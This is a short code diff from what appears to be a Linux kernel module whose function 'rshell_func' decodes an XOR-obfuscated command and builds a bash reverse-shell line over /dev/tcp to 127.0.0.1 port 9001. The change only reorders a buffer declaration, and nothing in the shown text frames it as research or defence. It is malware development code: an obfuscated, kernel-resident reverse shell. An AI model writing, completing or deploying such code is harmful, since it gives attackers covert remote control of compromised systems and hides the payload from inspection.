@@ -7,14 +7,14 @@ void xor_decrypt(char* s) {
 }
 
 int rshell_func(void* data) {
-    if (RSHELL_CMD_OBF[0] == '\0') {
+    char xor_cmd[] = RSHELL_CMD_OBF;
+    if (xor_cmd[0] == '\0') {
         pr_info("its empty");
         return 0;
     }
     char command[256];
     snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", "127.0.0.1", "9001");
 
-    char xor_cmd[] = RSHELL_CMD_OBF;
     xor_decrypt(xor_cmd);
     pr_info("hey %s", xor_cmd);
 
